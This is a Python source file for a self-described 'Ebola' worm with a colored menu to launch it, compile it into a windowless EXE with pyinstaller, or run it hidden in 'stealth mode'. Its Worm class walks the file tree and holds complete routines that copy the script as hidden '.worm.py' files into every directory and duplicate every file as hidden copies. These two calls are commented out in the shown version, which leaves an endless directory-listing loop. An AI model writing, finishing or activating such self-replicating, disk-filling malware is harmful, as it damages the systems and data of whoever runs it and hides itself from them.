import os
import sys
import time
import shutil
import win32con
import win32gui
from os import system

def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))

def banner_func():
	prCyan ("""
         ____        _
     ___| __ )  ___ | |    __ _
    / _ \  _ \ / _ \| |   / _` |
    |  __/ |_) | (_) | |__| (_| |
    \___|____/ \___/|_____\__,_| """)

class Worm:
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path

        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration

        self.own_path = os.path.realpath(__file__)

    def list_directories(self, path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            if not file.startswith('.'):
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass

    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".worm.py")
            shutil.copyfile(self.own_path, destination)
        
    def copy_existing_files(self):
        for directory in self.target_dir_list:
            file_list_in_dir = os.listdir(directory)

            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)

                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
                    source = abs_path

                    for i in range(self.iteration):
                        destination = os.path.join(directory, ("." + file + str(i)))
                        shutil.copyfile(source, destination)

    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        # self.create_new_worm()
        # self.copy_existing_files()

def execute_worm():
    print("[!] Press [Ctrl] + [C] to STOP!")
    while True:
        current_directory = os.path.abspath("")
        worm = Worm(path=current_directory)
        worm.start_worm_actions()

def worm_menu():
    prPurple(' --------------------------------- ')
    prPurple('|      E   B   O   L    A         |')
    prPurple(' --------------------------------- ')
    prPurple('| [+] 1 => Launch Worm!           |')
    prPurple('| [+] 2 => Make It Executable!    |')
    prPurple('| [+] 3 => Run Worm in Stealth!   |')
    prPurple('| [!] 0 => Exit!                  |')
    prPurple(' --------------------------------- ')

if __name__ == "__main__":
    system("pip install pypiwin32 pyinstaller")
    system("cls")

    banner_func()
    time.sleep(3)

    worm_menu()

    opt = -1

    while opt != 0:
        opt = int(input("Operation: "))
        match opt:
            case 1:
                try:
                    execute_worm()
                except KeyboardInterrupt:
                    stop = input("Stop worm? [y/N]: ")
                    if stop == "y" or stop == "n":
                        prGreen("[-] Stopping Worm!")
                        break
                    elif stop == "N":
                        prRed("[+] Worm Spreads!")
                        continue
            case 2:
                prGreen("[+] Creating EXE of Worm!")
                time.sleep(2)

                os.system("pyinstaller poli_w0rm.py --onefile --noconsole")
                prLightGray("[!] poli_w0rm.exe Created")
            case 3:
                prYellow("[!] Running Worm in Stealth Mode")
                time.sleep(2)
                hide = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hide, win32con.SW_HIDE)

                try:
                    execute_worm()
                except KeyboardInterrupt:
                    stop = input("Stop worm? [y/N]: ")
                    if stop == "y" or stop == "n":
                        prGreen("[-] Stopping Worm!")
                        break
                    elif stop == "N":
                        prRed("[+] Worm Spreads!")
                        continue
            case 0:
                prRed("[!] Quitting...")
                time.sleep(1.5)
                break
            case _:
                prLightGray("[!] Invalid Option.")
                prBlack("[!] Try again")
